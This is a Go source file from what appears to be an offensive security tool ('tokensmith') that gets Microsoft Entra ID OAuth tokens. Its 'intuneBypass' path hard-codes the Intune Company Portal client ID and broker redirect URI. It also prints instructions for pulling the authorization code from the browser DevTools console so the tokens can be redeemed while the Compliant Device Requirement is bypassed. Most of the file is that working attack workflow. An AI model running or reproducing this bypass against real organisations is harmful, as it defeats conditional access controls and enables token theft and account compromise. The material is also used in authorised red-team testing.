package auth

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"

	"github.com/gladstomych/tokensmith/internal/classes"
)

func reqAuthTknFlow(ClientID, redirectURI, Scope, authCode, userAgent string) error {

	tokenURL := classes.TokenV2Endpoint
	//tokenURL := "http://localhost:8080"
	body := fmt.Sprintf("Client_id=%s&redirect_uri=%s&grant_type=authorization_code&Scope=%s&code=%s", ClientID, redirectURI, Scope, authCode)

	Client := &http.Client{}
	req, err := http.NewRequest("POST", tokenURL, strings.NewReader(body))
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")

	resp, err := Client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}

	defer resp.Body.Close()
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}

	// var tr classes.TokenResponse
	err = parseRespTokens(string(respBody))
	if err != nil {
		log.Fatalln(err)
	}
	// return string(respBody)
	return nil
}

func InvokeAuthTokenFlow(intuneBypass bool) {
	var clientID string
	var resourceURL string
	var scope string
	var redirURI string
	var authURL string

	// build the auth URL

	resourceURL = classes.ResourceURL
	scope = classes.Scope

	if !intuneBypass {
		clientID = classes.ClientID
		redirURI = classes.RedirURI
		authURL = buildAuthURL(clientID, fmt.Sprintf("%s %s", scope, resourceURL), redirURI)

		fmt.Println("[1] To get Entra ID tokens, visit this URL on a browser and authenticate:")
		fmt.Println(authURL)

		fmt.Println("\n[2] After authentication, the browser should reach a blank page. Copy the contents of the URL bar.")
		fmt.Println("The URL should look like https://login.microsoftonline.com/common/oauth2/nativeClient?code=0.A...")
		fmt.Printf("\n[3] Paste URL here and Press <RETURN>\n>")

	} else {
		clientID = "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223"
		redirURI = "ms-appx-web://Microsoft.AAD.BrokerPlugin/S-1-15-2-2666988183-1750391847-2906264630-3525785777-2857982319-3063633125-1907478113"
		authURL = buildAuthURL(clientID, fmt.Sprintf("%s %s", scope, resourceURL), redirURI)

		fmt.Println("[1] To get your Entra ID tokens while bypassing Compliant Device Requirement, login on a browser (chromium-based recommended) with this URL:")
		fmt.Println(authURL)

		fmt.Println("\n[2] After authentication has completed, the page would either show:")
		fmt.Println("\n  [a] 'Are you trying to sign in to Microsoft Intune Company Portal?'. Click [Continue] and then press <Ctrl+Shift+J> to open DevTools.")
		fmt.Println("  [b] Or, there're dots [.....] looping. Press <Ctrl+Shift+J> to open DevTools.")
		fmt.Println("\n[3] On the Console Tab, locate the 'Failed to launch ms-appx-web://' error message, Right click and copy link address. The URL should look like ms-appx-web://Microsoft.AAD.BrokerPlugin/...")
		fmt.Printf("\n[4] Paste URL here and Press <RETURN>\n>")
	}

	scanner := bufio.NewScanner(os.Stdin)
	scanner.Scan()
	redirectURLPostAuth := scanner.Text()

	_, remaining, found := strings.Cut(redirectURLPostAuth, "code=")
	if !found {
		fmt.Println("Invalid URL: code parameter not found")
		os.Exit(1)
	}

	authCode, _, _ := strings.Cut(remaining, "&")

	// redeemedHTTPResp := reqAuthTknFlow(clientID, redirURI, fmt.Sprintf("%s %s", scope, resourceURL), authCode, classes.UserAgent)
	err := reqAuthTknFlow(clientID, redirURI, fmt.Sprintf("%s %s", scope, resourceURL), authCode, classes.UserAgent)
	if err != nil {
		log.Fatalln(err)
	}

	fmt.Println()

}
